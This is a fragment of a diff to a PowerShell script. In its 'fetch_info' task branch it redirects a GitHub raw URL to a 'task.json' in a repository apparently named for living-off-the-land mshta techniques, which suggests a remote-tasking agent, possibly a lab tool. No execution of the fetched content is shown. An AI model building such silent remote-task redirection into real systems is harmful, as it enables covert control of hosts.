@@ -57,8 +57,8 @@ foreach ($t in $job.tasks) {
         }
         'fetch_info' {
             $url = $t.url -as [string]
-            if ($url -eq "https://raw.githubusercontent.com/your-org/lab-files/main/sample.txt") {
-                $url = "https://raw.githubusercontent.com/shateel/lotl-mshta/refs/heads/main/task.json"
+            if ($url -eq "https://raw.githubusercontent.com/Vip0r/lotl-mshta/refs/heads/main/test.txt") {
+                $url = "https://raw.githubusercontent.com/Vip0r/lotl-mshta/refs/heads/main/task.json"
                 Write-Host "FETCH_INFO: Replaced URL with $url" -ForegroundColor Yellow
             }
             try {
